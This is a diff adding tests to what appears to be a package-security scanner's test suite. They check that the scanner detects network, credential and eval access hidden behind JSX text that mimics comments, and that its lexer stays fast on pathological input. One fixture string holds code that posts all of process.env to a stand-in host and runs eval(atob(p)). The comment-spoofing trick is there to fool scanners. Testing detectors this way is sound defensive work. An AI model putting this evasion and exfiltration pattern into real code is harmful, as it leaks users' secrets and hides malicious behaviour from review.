@@ -815,6 +815,54 @@ describe("review", () => {
     ).toEqual([]);
   }, 60_000);
 
+  test("JSX text never opens a comment in the code view", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "x", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    const spanning =
+      "const A = () => <p>/*</p>;\nconst s = JSON.stringify(process.env);\n" +
+      "fetch('https://x.invalid', {method:'POST', body:s});\neval(atob(p));\n" +
+      "const B = () => <p>*/</p>;\n";
+    for (const path of ["src/A.tsx", "src/A.jsx", "lib/a.js"]) {
+      expect(ruleIds(path, spanning), path).toEqual(
+        expect.arrayContaining([
+          "code.network-access",
+          "code.credential-access",
+          "code.dynamic-evaluation",
+        ]),
+      );
+      for (const line of [
+        "const A = () => <p>see // {fetch(u)}</p>;\n",
+        "const A = () => <p>/* {fetch(u)} */</p>;\n",
+        "const A = () => <div><br/>/*</div>; fetch(u); /**/\n",
+      ]) {
+        expect(ruleIds(path, line), `${path}: ${line}`).toContain("code.network-access");
+      }
+    }
+  });
+
+  test("the code view stays near-linear on shapes that are quadratic to lex", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "q", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    for (const [path, source] of [
+      ["lib/a.js", `fetch(u)\n${"(a)=>".repeat(120_000)}`],
+      ["lib/b.js", `fetch(u)\n${"(a)=>".repeat(52_000)}`],
+      ["src/App.svelte", `<script>\nfetch(u)\n${"/**/".repeat(64_000)}</script>\n`],
+    ]) {
+      const start = performance.now();
+      expect(ruleIds(path, source), path).toContain("code.network-access");
+      // Generous: well under a second here, against seconds to minutes before.
+      expect(performance.now() - start, path).toBeLessThan(15_000);
+    }
+  }, 120_000);
+
   test("nested template markers past the view budget fall back to raw text", () => {
     const textSample = "`${".repeat(1_300_000);
     const staged = [
